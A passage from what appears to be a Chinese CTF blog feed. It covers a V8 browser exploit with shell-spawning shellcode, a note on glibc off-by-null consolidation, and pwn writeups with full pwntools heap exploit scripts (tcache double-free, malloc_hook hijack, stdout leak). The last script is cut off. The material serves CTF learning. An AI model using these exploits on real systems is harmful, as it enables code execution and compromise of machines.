—▸ 0x56121b16ae00 ◂— 0x0</span></span><br><span class="line"><span class="comment">09:0048│   0x2e0fdf0a2328 —▸ 0xcb7732404d1 ◂— 0xcb7732405</span></span><br><span class="line"><span class="comment">0a:0050│   0x2e0fdf0a2330 ◂— 0x0</span></span><br><span class="line"><span class="comment">... ↓</span></span><br><span class="line"><span class="comment">0e:0070│   0x2e0fdf0a2350 —▸ 0x56121b16ae20 ◂— 0x0</span></span><br><span class="line"><span class="comment">0f:0078│   0x2e0fdf0a2358 —▸ 0xcb7732404d1 ◂— 0xcb7732405</span></span><br><span class="line"><span class="comment">10:0080│   0x2e0fdf0a2360 —▸ 0x56121b0dccd0 —▸ 0xcb773240751 ◂— 0x6200000cb7732407</span></span><br><span class="line"><span class="comment">11:0088│   0x2e0fdf0a2368 —▸ 0x1fa397b38000 ◂— movabs r10, 0x1fa397b38260 \/\* 0x1fa397b38260ba49 \*\/</span></span><br><span class="line"><span class="comment">12:0090│   0x2e0fdf0a2370 —▸ 0x1c02c944fc79 ◂— 0x710000182d332891</span></span><br><span class="line"><span class="comment">13:0098│   0x2e0fdf0a2378 —▸ 0x1c02c944fee9 ◂— 0x710000182d3328ad</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] wasm code address 0x"</span> + hex(code_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> data_view_addr = addressOf(data_view);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xb0</span>, <span class="number">0x3b</span>, <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0xff</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>,</span><br><span class="line">    <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x48</span>, <span class="number">0xc1</span>, <span class="number">0xef</span>, <span class="number">0x08</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> backing_store_addr = read(data_view_addr + <span class="number">0x18</span>n) + <span class="number">0x20</span>n - <span class="number">1</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] backing_store_addr 0x"</span> + hex(backing_store_addr));</span><br><span class="line">write(backing_store_addr, code_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; shellcode.length; i++)</span><br><span class="line">&#123;</span><br><span class="line">    data_view.setUint8(i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">func();</span><br></pre></td></tr></table></figure>

<p>这样执行就可以get shell了</p>
<p>当然，一般做题的时候会让你弹出计算器，将shellcode改为如下即可：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x50</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0xb8</span>, <span class="number">0x2e</span>, <span class="number">0x79</span>, <span class="number">0x62</span>, <span class="number">0x60</span>, <span class="number">0x6d</span>, <span class="number">0x62</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x24</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x50</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x68</span>, <span class="number">0x3b</span>, <span class="number">0x31</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x81</span>, <span class="number">0x34</span>, <span class="number">0x24</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x4c</span>, <span class="number">0x41</span>, <span class="number">0x59</span>,</span><br><span class="line">    <span class="number">0x3d</span>, <span class="number">0x50</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x52</span>, <span class="number">0x6a</span>, <span class="number">0x08</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xe2</span>, <span class="number">0x52</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x79</span>, <span class="number">0x62</span>, <span class="number">0x60</span>, <span class="number">0x6d</span>, <span class="number">0x62</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x56</span>, <span class="number">0x6a</span>, <span class="number">0x08</span>, <span class="number">0x5e</span>, <span class="number">0x48</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0xe6</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>

<p>这段代码相当于执行了<code>execve(&#39;/usr/bin/xcalc&#39;,&#39;xcalc&#39;,&#39;DISPLAY=:0&#39;)</code></p>
<p>我现在也不晓得为啥是这样</p>
<p>总之直接用<code>execve(&#39;/usr/bin/xcalc&#39;,NULL,NULL)</code>是不行的</p>
<h4 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h4><p>若想在chrome中弹出计算器，一定要用<code>path/to/chrome --no-sandbox</code>这样的方式打开，不然无法正常执行shellcode</p>
<h2 id="其他大佬的骚操作"><a href="#其他大佬的骚操作" class="headerlink" title="其他大佬的骚操作"></a>其他大佬的骚操作</h2><p>泄露elf基地址，libc地址，再通过libc地址泄露栈地址，然后构造ROP链，接着劫持返回地址……</p>
<p>这种方法不适用于我所遇到的情况……即chrome中的v8的各种偏移与我编译的不一样……</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题似乎并没有什么难度，但是对于我这样的菜鸟来说又充满了挑战与趣味性（v8编译的问题我就整了3天）</p>
<p>接下来就准备看一下队友要到的大佬的数字经济的exp，尝试去复现了</p>
<p>话说今天的360个人赛的pwn真简单……但是我也意识到了除了pwn其他的我啥也不太了解……</p>
<p>是太专了么？</p>
]]></content>
      
        <categories>
            
            <category> browser </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> CTF </tag>
            
            <tag> chrome </tag>
            
            <tag> v8 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[free时的向上合并]]></title>
      <url>/2019/10/16/free%E6%97%B6%E7%9A%84%E5%90%91%E4%B8%8A%E5%90%88%E5%B9%B6/</url>
      <content type="html"><![CDATA[<p>在一些pwn的题目中，有些题目最主要的漏洞点在off by null，所以就会存在一些必须触发向上合并才能进行利用的情况，在此简述一下触发向上合并所需条件</p>
<a id="more"></a>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24 malloc.c:4036</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">	unlink(av, nextchunk, bck, fwd);</span><br><span class="line">	size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">	clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>一般的利用方法就是，先malloc多个块，结构如下 (x86_64) ：</p>
<table>
<thead>
<tr>
<th align="center">malloc(size)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&gt;= 0x80</td>
</tr>
<tr>
<td align="center">&lt;= 0x70</td>
</tr>
<tr>
<td align="center">&lt;= 0x70</td>
</tr>
<tr>
<td align="center">&lt;= 0x70</td>
</tr>
<tr>
<td align="center">……</td>
</tr>
<tr>
<td align="center">&lt;= 0x70 | 8</td>
</tr>
<tr>
<td align="center">0xf0</td>
</tr>
<tr>
<td align="center">&lt;= 0x70</td>
</tr>
</tbody></table>
<ul>
<li>先free第一块，此时第二块的prev_size会变成第一块的size，且当前块的fd与bk会变成main_arena相应的地址</li>
<li>填充倒数第三快，将倒数第二块块的prev_size填写为第一块到最后一块的offset，然后再利用off by null将倒数第二块的prev_inuse覆盖为0</li>
<li>free最后一块</li>
</ul>
<p>参照如上代码此时，会先检查倒数第二块的prev_inuse位，此时它是0，所以会进入第一个if中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>它会根据prev_size找到前一块，即我们malloc的第一块，然后会将它及进行unlink</p>
<p>由于第一块的fd与bk都是它在main_arena的相应地址，因此unlink顺利通过</p>
<p>但是，事实上，不知为何，有一个检查并没有在源码上体现（可能是我没看见），它会在unlink之前检查一下prev_chunk即第一块的next_chunk的prev_size是否它的size相同。</p>
<p>接下来检查下一块是否是top chunk，很明显，不是，所以进入第二个if</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">     <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">     nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* consolidate forward */</span></span><br><span class="line">     <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">unlink(av, nextchunk, bck, fwd);</span><br><span class="line">size += nextsize;</span><br><span class="line">     &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>之后基本就无需操心了，它会直接进行下去</p>
]]></content>
      
        <categories>
            
            <category> 学习日记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> malloc </tag>
            
            <tag> free </tag>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[数字经济2019 pwn writeup]]></title>
      <url>/2019/10/06/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E2019/</url>
      <content type="html"><![CDATA[<p>国庆期间做了个小程序，没怎么学二进制……用这个来回一下档</p>
<p>所有题目都在：<a href="https://github.com/DayJun/Blogs/tree/master/Articles/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E2019" target="_blank" rel="noopener">Github</a></p>
<a id="more"></a>
<h1 id="amazon"><a href="#amazon" class="headerlink" title="amazon"></a>amazon</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/dajun/binary/shuzijingji/amazon/amazon&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>保护全开</p>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>这是一个模拟购物的程序，有四项基本功能</p>
<ol>
<li>buy</li>
<li>show</li>
<li>checkout</li>
<li>exit</li>
</ol>
<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul>
<li>在checkout函数中free之后没有没有清空指针</li>
</ul>
<h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><ul>
<li>它对可控制输入的位置做了限定，为指针 + 0x20的位置</li>
</ul>
<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>此处效仿同学</p>
<ol>
<li>利用Tcache的特点，对同一个0x100size的块free7次，将该size的Tcache数组填满</li>
<li>再次对该块free，然后show，可得到libc地址</li>
<li>此后，malloc的块都是从0x100size的块上分下来的</li>
<li>malloc两个小块，再malloc一个0x100size的大块，此时两小块皆处于大块内</li>
<li>控制第二个小块的fd指针，控制块分配到realloc_hook</li>
<li>将realloc_hook覆盖成one_gadget，再将malloc_hook覆盖成realloc+4</li>
<li>getshell</li>
</ol>
<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">success = <span class="keyword">lambda</span> x, y:log.success(x + <span class="string">' '</span>+ y)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./amazon'</span></span><br><span class="line">libc_name = <span class="string">'./libc-2.27.so'</span></span><br><span class="line"><span class="comment">#ip = 'chall.pwnable.tw'</span></span><br><span class="line"><span class="comment">#port = 10104</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">0</span>:</span><br><span class="line">    io = remote(<span class="string">'172.17.0.2'</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, cont)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice: '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'What item do you want to buy: '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'How many: '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'How long is your note: '</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">'Content: '</span>)</span><br><span class="line">    sl(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice: '</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice: '</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'Which item are you going to pay for: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'abc'</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    check(<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line">rn(<span class="number">6</span>)</span><br><span class="line">leak = u64(rn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'leak'</span>, hex(leak))</span><br><span class="line">base = leak - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">'base'</span>, hex(base))</span><br><span class="line">libc.address = base</span><br><span class="line">malloc_hook = libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc = libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'abc'</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'abc'</span>)</span><br><span class="line">check(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'t'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>) + p64(malloc_hook - <span class="number">0x28</span>))</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x18</span>, p64(base + <span class="number">0x4f322</span>) + p64(realloc+<span class="number">4</span>))</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h1 id="fkroman"><a href="#fkroman" class="headerlink" title="fkroman"></a>fkroman</h1><h2 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/dajun/binary/shuzijingji/fkroman/fkroman&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>保护全开</p>
<h2 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h2><p>喜闻乐见的菜单程序，有如下基本功能</p>
<ol>
<li>alloc</li>
<li>show</li>
<li>free</li>
<li>edit</li>
<li>exit</li>
</ol>
<h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul>
<li>依旧是free之后没有清空指针</li>
<li>edit函数可以导致溢出</li>
</ul>
<h3 id="难点-1"><a href="#难点-1" class="headerlink" title="难点"></a>难点</h3><ul>
<li>没有直接输出内容的函数</li>
</ul>
<h3 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h3><p>所幸见过一次这种题，当时没做出来，死活想不出来怎么leak</p>
<ol>
<li>malloc几个块，其中要有一个unsorted bin，并将其free</li>
<li>通过堆溢出，改变unsorted bin的size与fd指针的最后两个字节，将其分配到_IO_2_1_stdout_结构（看运气）</li>
<li>更改_IO_2_1_stdout_结构的flag为0xfbda1800，以及<br> _IO_read_ptr<br> _IO_read_end<br> _IO_read_base<br> _IO_write_base<br>为0，以及_IO_write_ptr的最后一字节为\x00<ol start="4">
<li>leak出libc地址，剩下就是简单的覆盖malloc_hook为one_gadget来getshell</li>
</ol>
</li>
</ol>
<h2 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h2><p>考验欧皇还是非酋的时候到了</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./fkroman'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#io = process('./fkroman')</span></span><br><span class="line">io = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'Index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Size: '</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add1</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice: '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    <span class="comment">#ru('Index: ')</span></span><br><span class="line">    sl(str(idx))</span><br><span class="line">    <span class="comment">#ru('Size: ')</span></span><br><span class="line">    sl(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, cont)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice: '</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'Index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Size: '</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">'Content: '</span>)</span><br><span class="line">    sl(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit1</span><span class="params">(idx, size, cont)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice: '</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'Index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Size: 